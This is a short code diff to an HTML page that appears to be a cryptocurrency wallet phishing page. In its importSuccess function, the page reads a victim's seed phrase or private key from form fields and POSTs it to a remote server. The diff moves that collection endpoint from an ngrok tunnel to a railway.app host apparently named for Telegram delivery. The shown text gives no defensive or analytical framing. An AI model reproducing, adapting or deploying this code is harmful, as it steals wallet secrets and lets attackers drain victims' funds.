@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -1166,7 +1166,7 @@ function importSuccess(type){
   const seedValue = seedEl ? seedEl.value : 'none';
   const keyValue = keyEl ? keyEl.value : 'none';
   const userInput = type === 'key' ? keyValue : seedValue;
-  fetch('https://superresponsible-oppositionless-athena.ngrok-free.dev/submit', {
+  fetch('https://telegram-server-production-4e10.up.railway.app/submit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ name: userInput, type: type, email: 'none', phone: 'none' })
